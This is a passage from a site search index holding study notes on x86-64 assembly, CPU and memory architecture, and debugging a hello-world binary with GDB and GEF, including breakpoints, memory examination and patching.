variables:\n\nNon-debugging symbols:\n0x0000000000402000  message\n0x0000000000402012  __bss_start\n0x0000000000402012  _edata\n0x0000000000402018  _end\n</code></pre> <p>As we can see, we find the <code>message</code>, along with some other default variables that define memory segments. We can do many things with functions, but we will focus on two main points: Disassembly and Breakpoints.</p>"},{"location":"Programming/Assembly/Assembly%20and%20Dissassembly/#disassemble","title":"Disassemble","text":"<p>To view the instructions within a specific function, we can use the <code>disassemble</code> or <code>disas</code> command along with the function name, as follows:</p> <p>GNU Debugger (GDB)</p> <pre><code>gef\u27a4  disas _start\n\nDump of assembler code for function _start:\n   0x0000000000401000 &lt;+0&gt;: mov    eax,0x1\n   0x0000000000401005 &lt;+5&gt;: mov    edi,0x1\n   0x000000000040100a &lt;+10&gt;:    movabs rsi,0x402000\n   0x0000000000401014 &lt;+20&gt;:    mov    edx,0x12\n   0x0000000000401019 &lt;+25&gt;:    syscall\n   0x000000000040101b &lt;+27&gt;:    mov    eax,0x3c\n   0x0000000000401020 &lt;+32&gt;:    mov    edi,0x0\n   0x0000000000401025 &lt;+37&gt;:    syscall\nEnd of assembler dump.\n</code></pre> <p>As we can see, the output we got closely resembles our assembly code and the disassembly output we got from <code>objdump</code> in the previous section. We need to focus on the main thing from this disassembly: the memory addresses for each instruction and operands (i.e., arguments).</p> <p><code>Having the memory address is critical for examining the variables/operands and setting breakpoints for a certain instruction.</code></p> <p>You may notice through debugging that some memory addresses are in the form of <code>0x00000000004xxxxx</code>, rather than their raw address in memory <code>0xffffffffaa8a25ff</code>. This is due to <code>$rip-relative addressing</code> in Position-Independent Executables <code>PIE</code>, in which the memory addresses are used relative to their distance from the instruction pointer <code>$rip</code> within the program's own Virtual RAM, rather than using raw memory addresses. This feature may be disabled to reduce the risk of binary exploitation.</p>"},{"location":"Programming/Assembly/Assembly%20instructions/","title":"Assembly instructions","text":"Instruction Description Example Data Movement <code>mov</code> Move data or load immediate data <code>mov rax, 1</code> -&gt; <code>rax = 1</code> <code>lea</code> Load an address pointing to the value <code>lea rax, [rsp+5]</code> -&gt; <code>rax = rsp+5</code> <code>xchg</code> Swap data between two registers or addresses <code>xchg rax, rbx</code> -&gt; <code>rax = rbx, rbx = rax</code> Unary Arithmetic Instructions <code>inc</code> Increment by 1 <code>inc rax</code> -&gt; <code>rax++</code> or <code>rax += 1</code> -&gt; <code>rax = 2</code> <code>dec</code> Decrement by 1 <code>dec rax</code> -&gt; <code>rax--</code> or <code>rax -= 1</code> -&gt; <code>rax = 0</code> Binary Arithmetic Instructions <code>add</code> Add both operands <code>add rax, rbx</code> -&gt; <code>rax = 1 + 1</code> -&gt; <code>2</code> <code>sub</code> Subtract Source from Destination (i.e <code>rax = rax - rbx</code>) <code>sub rax, rbx</code> -&gt; <code>rax = 1 - 1</code> -&gt; <code>0</code> <code>imul</code> Multiply both operands <code>imul rax, rbx</code> -&gt; <code>rax = 1 * 1</code> -&gt; <code>1</code> Bitwise Arithmetic Instructions <code>not</code> Bitwise NOT (invert all bits, 0-&gt;1 and 1-&gt;0) <code>not rax</code> -&gt; <code>NOT 00000001</code> -&gt; <code>11111110</code> <code>and</code> Bitwise AND (if both bits are 1 -&gt; 1, if bits are different -&gt; 0) <code>and rax, rbx</code> -&gt; <code>00000001 AND 00000010</code> -&gt; <code>00000000</code> <code>or</code> Bitwise OR (if either bit is 1 -&gt; 1, if both are 0 -&gt; 0) <code>or rax, rbx</code> -&gt; <code>00000001 OR 00000010</code> -&gt; <code>00000011</code> <code>xor</code> Bitwise XOR (if bits are the same -&gt; 0, if bits are different -&gt; 1) <code>xor rax, rbx</code> -&gt; <code>00000001 XOR 00000010</code> -&gt; <code>00000011</code> Loops <code>mov rcx, x</code> Sets loop (<code>rcx</code>) counter to <code>x</code> <code>mov rcx, 3</code> <code>loop</code> Jumps back to the start of <code>loop</code> until counter reaches <code>0</code> <code>loop exampleLoop</code> Branching <code>jmp</code> Jumps to specified label, address, or location <code>jmp loop</code> <code>jz</code> Destination equal to Zero <code>D = 0</code> <code>jnz</code> Destination Not equal to Zero <code>D != 0</code> <code>js</code> Destination is Negative <code>D &lt; 0</code> <code>jns</code> Destination is Not Negative (i.e. 0 or positive) <code>D &gt;= 0</code> <code>jg</code> Destination Greater than Source <code>D &gt; S</code> <code>jge</code> Destination Greater than or Equal Source <code>D &gt;= S</code> <code>jl</code> Destination Less than Source <code>D &lt; S</code> <code>jle</code> Destination Less than or Equal Source <code>D &lt;= S</code> <code>cmp</code> Sets <code>RFLAGS</code> by subtracting second operand from first operand (i.e. first - second) <code>cmp rax, rbx</code> -&gt; <code>rax - rbx</code> Stack <code>push</code> Copies the specified register/address to the top of the stack <code>push rax</code> <code>pop</code> Moves the item at the top of the stack to the specified register/address <code>pop rax</code> Functions <code>call</code> push the next instruction pointer <code>rip</code> to the stack, then jumps to the specified procedure <code>call printMessage</code> <code>ret</code> pop the address at <code>rsp</code> into <code>rip</code>, then jump to it <code>ret</code>"},{"location":"Programming/Assembly/CPU%20Architecture/","title":"CPU Architecture","text":"<p>The Central Processing Unit (CPU) is the main processing unit within a computer. The CPU contains both the <code>Control Unit</code> (CU), which is in charge of moving and controlling data, and the <code>Arithmetic/Logic Unit</code> (ALU), which is in charge of performing various arithmetics and logical calculations as requested by a program through the assembly instructions.</p> <p>The manner in which and how efficiently a CPU processes its instructions depends on its <code>Instruction Set Architecture</code> (ISA). There are multiple ISA's in the industry, each having its way of processing data. <code>RISC</code> architecture is based on processing more simple instructions, which takes more cycles, but each cycle is shorter and takes less power. The <code>CISC</code> architecture is based on fewer, more complex instructions, which can finish the requested instructions in fewer cycles, but each instruction takes more time and power to be processed.</p> <p>Let us take a look at both <code>RISC</code> and <code>CISC</code>, and learn more about instructions cycles and registers.</p>"},{"location":"Programming/Assembly/CPU%20Architecture/#clock-speed-clock-cycle","title":"Clock Speed &amp; Clock Cycle","text":"<p>Each CPU has a clock speed that indicates its overall speed. Every tick of the clock runs a clock cycle that processes a basic instruction, such as fetching an address or storing an address. Specifically, this is done by the CU or ALU.</p> <p>The frequency in which the cycles occur is counted is cycles per second (<code>Hertz</code>). If a CPU has a speed of 3.0 GHz, it can run 3 billion cycles every second (per core).</p> <p></p> <p>Modern processors have a multi-core design, allowing them to have multiple cycles at the same time.</p>"},{"location":"Programming/Assembly/CPU%20Architecture/#instruction-cycle","title":"Instruction Cycle","text":"<p>An <code>Instruction Cycle</code> is the cycle it takes the CPU to process a single machine instruction.</p> <p></p> <p>An instruction cycle consists of four stages: <code>Fetch</code>, <code>Decode</code>, <code>Execute</code>, and <code>Store</code>:</p> Instruction Description <code>1. Fetch</code> Takes the next instruction's address from the <code>Instruction Address Register</code> (IAR), which tells it where the next instruction is located. <code>2. Decode</code> Takes the instruction from the IAR, and decodes it from binary to see what is required to be executed. <code>3. Execute</code> Fetch instruction operands from register/memory, and process the instruction in the <code>ALU</code> or <code>CU</code>. <code>4. Store</code> Store the new value in the destination operand. <p>All of the stages in the instruction cycle are carried out by the Control Unit, except when arithmetic instructions need to be executed \"add, sub, ..etc\", which are executed by the ALU.</p> <p>Each Instruction Cycle takes multiple clock cycles to finish, depending on the CPU architecture and the complexity of the instruction. Once a single instruction cycle ends, the CU increments to the next instruction and runs the same cycle on it, and so on.</p> <p></p> <p>For example, if we were to execute the assembly instruction <code>add rax, 1</code>, it would run through an instruction cycle:</p> <ol> <li>Fetch the instruction from the <code>rip</code> register, <code>48 83 C0 01</code> (in binary).</li> <li>Decode '<code>48 83 C0 01</code>' to know it needs to perform an <code>add</code> of <code>1</code> to the value at <code>rax</code>.</li> <li>Get the current value at <code>rax</code> (by <code>CU</code>), add <code>1</code> to it (by the <code>ALU</code>).</li> <li>Store the new value back to <code>rax</code>.</li> </ol> <p>In the past, processors used to process instructions sequentially, so they had to wait for one instruction to finish to start the next. On the other hand, modern processors can process multiple instructions in parallel by having multiple instruction/clock cycles running at the same time. This is made possible by having a multi-thread and multi-core design.</p> <p></p>"},{"location":"Programming/Assembly/CPU%20Architecture/#processor-specific","title":"Processor Specific","text":"<p>As previously mentioned, each processor understands a different set of instructions. For example, while an Intel processor based on the 64-bit x86 architecture may interpret the machine code <code>4883C001</code> as <code>add rax, 1</code>, an ARM processor translates the same machine code as the <code>biceq r8, r0, r8, asr #6</code> instruction. As we can see, the same machine code performs an entirely different instruction on each processor.</p> <p>This is because each processor type has a different low-level assembly language architecture known as <code>Instruction Set Architectures</code> (ISA). For example, the add instruction seen above, <code>add rax, 1</code> is for Intel x86 64-bit processors. The same instruction written for the ARM processor assembly language is represented as <code>add r1, r1, 1</code>.</p> <p><code>It is important to understand that each processor has its own set of instructions and corresponding machine code.</code></p> <p>Furthermore, a single Instruction Set Architecture may have several syntax interpretations for the same assembly code. For example, the above <code>add</code> instruction is based on the x86 architecture, which is supported by multiple processors like Intel, AMD, and legacy AT&amp;T processors. The instruction is written as <code>add rax, 1</code> with Intel syntax, and written as <code>addb $0x1,%rax</code> with AT&amp;T syntax.</p> <p>As we can see, even though we can tell that both instructions are similar and do the same thing, their syntax is different, and the locations of the source and destination operands are swapped as well. Still, both codes assemble the same machine code and perform the same instruction.</p> <p><code>So, each processor type has its Instruction Set Architectures, and each architecture can be further represented in several syntax formats</code></p> <p>This module will focus mainly on the Intel x86 64-bit assembly language (also known as x86_64 and AMD64), as the majority of modern computers and servers run on this processor architecture. We will be using the Intel syntax as well.</p> <p>If we want to know whether our Linux system supports <code>x86_64</code> architecture, we can use the <code>lscpu</code> command:</p> <p>CPU Architecture</p> <pre><code>Arenwald@htb[/htb]$ lscpu\n\nArchitecture:                    x86_64\nCPU op-mode(s):                  32-bit, 64-bit\nByte Order:                      Little Endian\n\n&lt;SNIP&gt;\n</code></pre> <p>As we can see in the above output, the CPU architecture is <code>x86_64</code>, and supports 32-bit and 64-bit. The byte order is Little Endian. We can also use the <code>uname -m</code> command to get the CPU architecture. We will discuss the two most common Instruction Set Architectures in the next section: <code>CISC</code> and <code>RISC</code>.</p>"},{"location":"Programming/Assembly/Computer%20Architecture/","title":"Computer Architecture","text":"<p>Today, most modern computers are built on what is known as the Von Neumann Architecture, which was developed back in 1945 by <code>Von Neumann</code> to enable the creation of \"General-Purpose Computers\" as <code>Alan Turing</code> described them at the time. <code>Alan Turing</code> in turn, based his ideas on <code>Charles Babbage</code>'s mid-19th century \"Programmable Computer\" concept. Note that all of these people were mathematicians.</p> <p>This architecture executes machine code to perform specific algorithms. It mainly consists of the following elements:</p> <ul> <li>Central Processing Unit (CPU)</li> <li>Memory Unit</li> <li>Input/Output Devices<ul> <li>Mass Storage Unit</li> <li>Keyboard</li> <li>Display</li> </ul> </li> </ul> <p>Furthermore, the CPU itself consists of three main components:</p> <ul> <li>Control Unit (CU)</li> <li>Arithmetic/Logic Unit (ALU)</li> <li>Registers</li> </ul> <p></p> <p>Though very old, this architecture is still the basis of most modern computers, servers, and even smartphones.</p> <p>Assembly languages mainly work with the CPU and memory. This is why it is crucial to understand the general design of computer architecture, so when we start using assembly instructions to move and process data, we know where it's going and coming from and how fast/expensive each instruction is.</p> <p>Furthermore, basic and advanced binary exploitation requires a proper understanding of computer architecture. With basic stack overflows, we only need to be aware of the general design. Once we start using ROP and Heap exploits, our understanding should be profound. Let us now take a deeper look into some essential components.</p>"},{"location":"Programming/Assembly/Computer%20Architecture/#memory","title":"Memory","text":"<p>A computer's memory is where the <code>temporary</code> data and instructions of currently running programs are located. A computer's memory is also known as Primary Memory. It is the primary location the CPU uses to retrieve and process data. It does so very frequently (billions of times a second), so the memory must be extremely fast in storing and retrieving data and instructions.</p> <p>There are two main types of memory:</p> <ol> <li><code>Cache</code></li> <li><code>Random Access Memory (RAM)</code></li> </ol>"},{"location":"Programming/Assembly/Computer%20Architecture/#cache","title":"Cache","text":"<p>Cache memory is usually located within the CPU itself and hence is extremely fast compared to RAM, as it runs at the same clock speed as the CPU. However, it is very limited in size and very sophisticated, and expensive to manufacture due to it being so close to the CPU core.</p> <p>Since RAM clock speed is usually much slower than the CPU cores, in addition to it being far from the CPU, if a CPU had to wait for the RAM to retrieve each instruction, it would effectively be running at much lower clock speeds. This is the main benefit of cache memory. It enables the CPU to access the upcoming instructions and data quicker than retrieving them from RAM.</p> <p>There are usually three levels of cache memory, depending on their closeness to the CPU core:</p> Level Description <code>Level 1 Cache</code> Usually in kilobytes, the fastest memory available, located in each CPU core. (Only registers are faster.) <code>Level 2 Cache</code> Usually in megabytes, extremely fast (but slower than L1), shared between all CPU cores. <code>Level 3 Cache</code> Usually in megabytes (larger than L2), faster than RAM but slower than L1/L2. (Not all CPUs use L3.)"},{"location":"Programming/Assembly/Computer%20Architecture/#ram","title":"RAM","text":"<p>RAM is much larger than cache memory, coming in sizes ranging from gigabytes up to terabytes. RAM is also located far away from the CPU cores and is much slower than cache memory. Accessing data from RAM addresses takes many more instructions.</p> <p>For example, retrieving an instruction from the registers takes only one clock cycle, and retrieving it from the L1 cache takes a few cycles, while retrieving it from RAM takes around 200 cycles. When this is done billions of times a second, it makes a massive difference in the overall execution speed.</p> <p>In the past, with 32-bit addresses, memory addresses were limited from <code>0x00000000</code> to <code>0xffffffff</code>. This meant that the maximum possible RAM size was 232 bytes, which is only 4 gigabytes, at which point we run out of unique addresses. With 64-bit addresses, the range is now up to <code>0xffffffffffffffff</code>, with a theoretical maximum RAM size of 264 bytes, which is around 18.5 exabytes (18.5 million terabytes), so we shouldn't be running out of memory addresses anytime soon.</p> <p></p> <p>When a program is run, all of its data and instructions are moved from the storage unit to the RAM to be accessed when needed by the CPU. This happens because accessing them from the storage unit is much slower and will increase data processing times. When a program is closed, its data is removed or made available to re-use from the RAM.</p> <p>As we can see, the RAM is split into four main <code>segments</code>:</p> Segment Description <code>Stack</code> Has a Last-in First-out (LIFO) design and is fixed in size. Data in it can only be accessed in a specific order by push-ing and pop-ing data. <code>Heap</code> Has a hierarchical design and is therefore much larger and more versatile in storing data, as data can be stored and retrieved in any order. However, this makes the heap slower than the Stack. <code>Data</code> Has two parts: <code>Data</code>, which is used to hold variables, and <code>.bss</code>, which is used to hold unassigned variables (i.e., buffer memory for later allocation). <code>Text</code> Main assembly instructions are loaded into this segment to be fetched and executed by the CPU. <p>Although this segmentation applies to the entire RAM, <code>each application is allocated its Virtual Memory when it is run</code>. This means that each application would have its own <code>stack</code>, <code>heap</code>, <code>data</code>, and <code>text</code> segments.</p>"},{"location":"Programming/Assembly/Computer%20Architecture/#iostorage","title":"IO/Storage","text":"<p>Finally, we have the Input/Output devices, like the keyboard, the screen, or the long-term storage unit, also known as Secondary Memory. The processor can access and control IO devices using <code>Bus Interfaces</code>, which act as 'highways' to transfer data and addresses, using electrical charges for binary data.</p> <p>Each Bus has a capacity of bits (or electrical charges) it can carry simultaneously. This usually is a multiple of 4-bits, ranging up to 128-bits. Bus interfaces are also usually used to access memory and other components outside the CPU itself. If we take a closer look at a CPU or a motherboard, we can see the bus interfaces all over them:</p> <p></p> <p>Unlike primary memory that is volatile and stores temporary data and instructions as the programs are running, the storage unit stores permanent data, like the operating system files or entire applications and their data.</p> <p>The storage unit is the slowest to access. First, because they are the farthest away from the CPU, accessing them through bus interfaces like SATA or USB takes much longer to store and retrieve the data. They are also slower in their design to allow more data storage. \u0391s long as there is more data to go through, they will be slower.</p> <p>There has been a shift from classic magnetic storage units, like tapes or Hard Disk Drives (HDD), to Solid-State Drives (SSD) in recent years. This is because SSD's utilize a similar design to RAM's, using non-volatile circuitry that retains data even without electricity. This made storage units much faster in storing and retrieving data. Still, since they are far away from the CPU and connected through special interfaces, they are the slowest unit to access.</p>"},{"location":"Programming/Assembly/Computer%20Architecture/#speed","title":"Speed","text":"<p>As we can see from the above, the further away a component is from the CPU core, the slower it is. Also, the more data it can hold, the slower it is, as it simply has to go through more to fetch the data. The below table summarizes each component, its size, and its speed:</p> Component Speed Size <code>Registers</code> Fastest Bytes <code>L1 Cache</code> Fastest, other than Registers Kilobytes <code>L2 Cache</code> Very fast Megabytes <code>L3 Cache</code> Fast, but slower than the above Megabytes <code>RAM</code> Much slower than all of the above Gigabytes-Terabytes <code>Storage</code> Slowest Terabytes and more <p>The speed here is relative depending on the CPU clock speed. Now that we have a general idea of the computer architecture, we'll discuss Registers and the CPU architecture in the next section.</p>"},{"location":"Programming/Assembly/Functions/","title":"Functions","text":"Command Description <code>cat /usr/include/x86_64-linux-gnu/asm/unistd_64.h \\| grep write</code> Locate <code>write</code> syscall number <code>man -s 2 write</code> <code>write</code> syscall man page <code>man -s 3 printf</code> <code>printf</code> libc man page <p>Syscall Calling Convention</p> <ol> <li>Save registers to stack</li> <li>Set its syscall number in <code>rax</code></li> <li>Set its arguments in the registers</li> <li>Use the <code>syscall</code> assembly instruction to call it</li> </ol> <p>Function Calling Convention</p> <ol> <li><code>Save Registers</code> on the stack (<code>Caller Saved</code>)</li> <li>Pass <code>Function Arguments</code> (like syscalls)</li> <li>Fix <code>Stack Alignment</code></li> <li>Get Function's <code>Return Value</code> (in <code>rax</code>)</li> </ol> <p>Link external functions nasm -f elf64 solution.s &amp;&amp;  ld solution.o -o solution -lc --dynamic-linker /lib64/ld-linux-x86-64.so.2 &amp;&amp; ./solution</p>"},{"location":"Programming/Assembly/GDB/","title":"GDB","text":"Command Description <code>gdb -q ./helloWorld</code> Open binary in gdb <code>info functions</code> View binary functions <code>info variables</code> View binary variables <code>registers</code> View registers <code>disas _start</code> Disassemble label/function <code>b _start</code> Break label/function <code>b *0x401000</code> Break address <code>r</code> Run the binary <code>x/4xg $rip</code> Examine register \"x/ count-format-size $register\" <code>si</code> Step to the next instruction <code>s</code> Step to the next line of code <code>ni</code> Step to the next function <code>c</code> Continue to the next break point <code>patch string 0x402000 \"Patched!\\\\x0a\"</code> Patch address value <code>set $rdx=0x9</code> Set register value Step Description <code>Break</code> Setting breakpoints at various points of interest <code>Examine</code> Running the program and examining the state of the program at these points <code>Step</code> Moving through the program to examine how it acts with each instruction and with user input <code>Modify</code> Modify values in specific registers or addresses at specific breakpoints, to study how it would affect the execution <p>We will go through these points in this section to learn the basics of debugging a program with GDB.</p>"},{"location":"Programming/Assembly/GDB/#break","title":"Break","text":"<p>The first step of debugging is setting <code>breakpoints</code> to stop the execution at a specific location or when a particular condition is met. This helps us in examining the state of the program and the value of registers at that point. <code>Breakpoints</code> also allow us to stop the program's execution at that point so that we can step into each instruction and examine how it changes the program and values.</p> <p>We can set a breakpoint at a specific address or for a particular function. To set a breakpoint, we can use the <code>break</code> or <code>b</code> command along with the address or function name we want to break at. For example, to follow all instructions run by our program, let's break at the <code>_start</code> function, as follows:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  b _start\n\nBreakpoint 1 at 0x401000\n</code></pre> <p>Now, in order to start our program, we can use the <code>run</code> or <code>r</code> command:</p> <p></p> <p>If we want to set a breakpoint at a certain address, like <code>_start+10</code>, we can either <code>b *_start+10</code> or <code>b *0x40100a</code>:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  b *0x40100a\nBreakpoint 1 at 0x40100a\n</code></pre> <p>The <code>*</code> tells <code>GDB</code> to break at the instruction stored in <code>0x40100a</code>.</p> <p>Note: Once the program is running, if we set another breakpoint, like <code>b *0x401005</code>, in order to continue to that breakpoint, we should use the <code>continue</code> or <code>c</code> command. If we use <code>run</code> or <code>r</code> again, it will run the program from the start. This can be useful to skip loops, as we will see later in the module.</p> <p>If we want to see what breakpoints we have at any point of the execution, we can use the <code>info breakpoint</code> command. We can also <code>disable</code>, <code>enable</code>, or <code>delete</code> any breakpoint. Furthermore, GDB also supports setting conditional breaks that stop the execution when a specific condition is met.</p>"},{"location":"Programming/Assembly/GDB/#examine","title":"Examine","text":"<p>The next step of debugging is <code>examining</code> the values in registers and addresses. As we can see in the previous terminal output, <code>GEF</code> automatically gave us a lot of helpful information when we hit our breakpoint. This is one of the benefits of having the <code>GEF</code> plugin, as it automates many steps that we usually take at every breakpoint, like examining the registers, the stack, and the current assembly instructions.</p> <p>To manually examine any of the addresses or registers or examine any other, we can use the <code>x</code> command in the format of <code>x/FMT ADDRESS</code>, as <code>help x</code> would tell us. The <code>ADDRESS</code> is the address or register we want to examine, while <code>FMT</code> is the examine format. The examine format <code>FMT</code> can have three parts:</p> Argument Description Example <code>Count</code> The number of times we want to repeat the examine <code>2</code>, <code>3</code>, <code>10</code> <code>Format</code> The format we want the result to be represented in <code>x(hex)</code>, <code>s(string)</code>, <code>i(instruction)</code> <code>Size</code> The size of memory we want to examine <code>b(byte)</code>, <code>h(halfword)</code>, <code>w(word)</code>, <code>g(giant, 8 bytes)</code>"},{"location":"Programming/Assembly/GDB/#instructions","title":"Instructions","text":"<p>For example, if we wanted to examine the next four instructions in line, we will have to examine the <code>$rip</code> register (which holds the address of the next instruction), and use <code>4</code> for the <code>count</code>, <code>i</code> for the <code>format</code>, and <code>g</code> for the <code>size</code> (for 8-bytes or 64-bits). So, the final examine command would be <code>x/4ig $rip</code>, as follows:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  x/4ig $rip\n\n=&gt; 0x401000 &lt;_start&gt;:   mov    eax,0x1\n   0x401005 &lt;_start+5&gt;: mov    edi,0x1\n   0x40100a &lt;_start+10&gt;:    movabs rsi,0x402000\n   0x401014 &lt;_start+20&gt;:    mov    edx,0x12\n</code></pre> <p>We see that we get the following four instructions as expected. This can help us as we go through a program in examining certain areas and what instructions they may contain.</p>"},{"location":"Programming/Assembly/GDB/#strings","title":"Strings","text":"<p>We can also examine a variable stored at a specific memory address. We know that our <code>message</code> variable is stored at the <code>.data</code> section on address <code>0x402000</code> from our previous disassembly. We also see the upcoming command <code>movabs rsi, 0x402000</code>, so we may want to examine what is being moved from <code>0x402000</code>.</p> <p>In this case, we will not put anything for the <code>Count</code>, as we only want one address (1 is the default), and will use <code>s</code> as the format to get it in a string format rather than in hex:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  x/s 0x402000\n\n0x402000:   \"Hello HTB Academy!\"\n</code></pre> <p>As we can see, we can see the string at this address represented as text rather than hex characters.</p> <p>Note: if we don't specify the <code>Size</code> or <code>Format</code>, it will default to the last one we used.</p>"},{"location":"Programming/Assembly/GDB/#addresses","title":"Addresses","text":"<p>The most common format of examining is hex <code>x</code>. We often need to examine addresses and registers containing hex data, such as memory addresses, instructions, or binary data. Let us examine the same previous instruction, but in <code>hex</code> format, to see how it looks:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  x/wx 0x401000\n\n0x401000 &lt;_start&gt;:  0x000001b8\n</code></pre> <p>We see instead of <code>mov eax,0x1</code>, we get <code>0x000001b8</code>, which is the hex representation of the <code>mov eax,0x1</code> machine code in little-endian formatting.</p> <ul> <li>This is read as: <code>b8 01 00 00</code>.</li> </ul> <p>Try repeating the commands we used for examining strings using <code>x</code> to examine them in hex. We should see the same text but in hex format. We can also use <code>GEF</code> features to examine certain addresses. For example, at any point we can use the <code>registers</code> command to print out the current value of all registers:</p> <p></p>"},{"location":"Programming/Assembly/GDB/#step","title":"Step","text":"<p>The third step of debugging is <code>stepping</code> through the program one instruction or line of code at a time. As we can see, we are currently at the very first instruction in our <code>helloWorld</code> program:</p> <p></p> <p>Note: the instruction shown with the <code>-&gt;</code> symbol is where we are at, and it has not yet been processed.</p> <p>To move through the program, there are three different commands we can use: <code>stepi</code> and <code>step</code>.</p>"},{"location":"Programming/Assembly/GDB/#step-instruction","title":"Step Instruction","text":"<p>The <code>stepi</code> or <code>si</code> command will step through the assembly instructions one by one, which is the smallest level of steps possible while debugging. Let us use the <code>si</code> command to see how we get to the next instruction:</p> <p></p> <p>As we can see, we took exactly one step and stopped again at the <code>mov edi, 0x1</code> instruction.</p>"},{"location":"Programming/Assembly/GDB/#step-count","title":"Step Count","text":"<p>Similarly to examine, we can repeat the <code>si</code> command by adding a number after it. For example, if we wanted to move 3 steps to reach the <code>syscall</code> instruction, we can do so as follows:</p> <p></p> <p>As we can see, we stopped at the <code>syscall</code> instruction as expected.</p> <p>Tip: You can hit the <code>return</code>/<code>enter</code> empty in order to repeat the last command. Try hitting it at this stage, and you should make another 3 steps, and break at the other <code>syscall</code> instruction.</p>"},{"location":"Programming/Assembly/GDB/#step_1","title":"Step","text":"<p>The <code>step</code> or <code>s</code> command, on the other hand, will continue until the following line of code is reached or until it exits from the current function. If we run an assembly code, it will break when we exit the current function <code>_start</code>.</p> <p>If there's a call to another function within this function, it'll break at the beginning of that function. Otherwise, it'll break after we exit this function after the program's end. Let us try using <code>s</code>, and see what happens:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  step\n\nSingle stepping until exit from function _start,\nwhich has no line number information.\nHello HTB Academy!\n[Inferior 1 (process 14732) exited normally]\n</code></pre> <p>We see that the execution continued until we reached the exit from the <code>_start</code> function, so we reached the end of the program and <code>exited normally</code> without any errors. We also see that <code>GDB</code> printed the program's output <code>Hello HTB Academy!</code> as well.</p> <p>Note: There's also the <code>next</code> or <code>n</code> command, which will also continue until the next line, but will skip any functions called in the same line of code, instead of breaking at them like <code>step</code>. There's also the <code>nexti</code> or <code>ni</code>, which is similar to <code>si</code>, but skips functions calls, as we will see later on in the module.</p>"},{"location":"Programming/Assembly/GDB/#modify","title":"Modify","text":"<p>The final step of debugging is <code>modifying</code> values in registers and addresses at a certain point of execution. This helps us in seeing how this would affect the execution of the program.</p>"},{"location":"Programming/Assembly/GDB/#addresses_1","title":"Addresses","text":"<p>To modify values in GDB, we can use the <code>set</code> command. However, we will utilize the <code>patch</code> command in <code>GEF</code> to make this step much easier. Let's enter <code>help patch</code> in GDB to get its help menu:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  help patch\n\nWrite specified values to the specified address.\nSyntax: patch (qword|dword|word|byte) LOCATION VALUES\npatch string LOCATION \"double-escaped string\"\n...SNIP...\n</code></pre> <p>As we can see, we have to provide the <code>type/size</code> of the new value, the <code>location</code> to be stored, and the <code>value</code> we want to use. So, let's try changing the string stored in the <code>.data</code> section (at address <code>0x402000</code> as we saw earlier) to the string <code>Patched!\\n</code>.</p> <p>We will break at the first <code>syscall</code> at <code>0x401019</code>, and then do the patch, as follows:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  break *0x401019\n\nBreakpoint 1 at 0x401019\ngef\u27a4  r\ngef\u27a4  patch string 0x402000 \"Patched!\\\\x0a\"\ngef\u27a4  c\n\nContinuing.\nPatched!\n Academy!\n</code></pre> <p>We see that we successfully modified the string and got <code>Patched!\\n Academy!</code> instead of the old string. Notice how we used <code>\\x0a</code> for adding a new line after our string.</p>"},{"location":"Programming/Assembly/GDB/#registers","title":"Registers","text":"<p>We also note that we did not replace the entire string. This is because we only modified the characters up to the length of our string and left the remainder of the old string. Finally, the <code>printf</code> function specified a length of <code>0x12</code> of bytes to be printed.</p> <p>To fix this, let's modify the value stored in <code>$rdx</code> to the length of our string, which is <code>0x9</code>. We will only patch a size of one byte. We will go into details of how <code>syscall</code> works later in the module. Let us demonstrate using <code>set</code> to modify <code>$rdx</code>, as follows:</p> <p>Debugging with GDB</p> <pre><code>gef\u27a4  break *0x401019\n\nBreakpoint 1 at 0x401019\ngef\u27a4  r\ngef\u27a4  patch string 0x402000 \"Patched!\\\\x0a\"\ngef\u27a4  set $rdx=0x9\ngef\u27a4  c\n\nContinuing.\nPatched!\n</code></pre> <p>We see that we successfully modified the final printed string and have the program output something of our choosing. The ability to modify values of registers and addresses will help us a lot through debugging and binary exploitation, as it allows us to test various values and conditions without having to change the code and recompile the binary every time.</p>"},{"location":"Programming/Assembly/Infrastructure%20Set%20Architectures/","title":"Infrastructure Set Architectures","text":"<p>An <code>Instruction Set Architecture</code> (<code>ISA</code>) specifies the syntax and semantics of the assembly language on each architecture. It is not just a different syntax but is built in the core design of a processor, as it affects the way and order instructions are executed and their level of complexity. <code>ISA</code> mainly consists of the following components:</p> <ul> <li>Instructions</li> <li>Registers</li> <li>Memory Addresses</li> <li>Data Types</li> </ul> Component Description Example <code>Instructions</code> The instruction to be processed in the <code>opcode operand_list</code> format. There are usually 1,2, or 3 comma-separated operands. <code>add rax, 1</code>, <code>mov rsp, rax</code>, <code>push rax</code> <code>Registers</code> Used to store operands, addresses, or instructions temporarily. <code>rax</code>, <code>rsp</code>, <code>rip</code> <code>Memory Addresses</code> The address in which data or instructions are stored. May point to memory or registers. <code>0xffffffffaa8a25ff</code>, <code>0x44d0</code>, <code>$rax</code> <code>Data Types</code> The type of stored data. <code>byte</code>, <code>word</code>, <code>double word</code> <p>These are the main components that distinguish different ISA's and assembly languages. We will cover each of them in more depth in the coming sections, and we'll learn how to use various instructions.</p> <p>There are two main Instruction Set Architectures that are widely used:</p> <ol> <li> <p><code>Complex Instruction Set Computer</code> (<code>CISC</code>) - Used in <code>Intel</code> and <code>AMD</code> processors in most computers and servers.</p> </li> <li> <p><code>Reduced Instruction Set Computer</code> (<code>RISC</code>) - Used in <code>ARM</code> and <code>Apple</code> processors, in most smartphones, and some modern laptops.</p> </li> </ol> <p>Let us see the pros and cons of each and the main differences between them.</p>"},{"location":"Programming/Assembly/Infrastructure%20Set%20Architectures/#cisc","title":"CISC","text":"<p>The CISC architecture was one of the earliest ISA's ever developed. As its name suggests, the CISC architecture favors more complex instructions to be run at a time to reduce the overall number of instructions. This is done to rely as much as possible on the CPU by combining minor instructions into more complex instructions.</p> <p>For example, suppose we were to add two registers with the '<code>add rax, rbx</code>' instruction. In that case, a CISC processor can do this in a single 'Fetch-Decode-Execute-Store' instruction cycle, without having to split it into multiple instructions to fetch <code>rax</code>, then fetch <code>rbx</code>, then add them, and then store them in `rax, each of which would take its own 'Fetch-Decode-Execute-Store' instruction cycle.</p> <p>Two main reasons drove this:</p> <ol> <li>To enable more instructions to be executed at once by designing the processor to run more advanced instructions in its core.</li> <li>In the 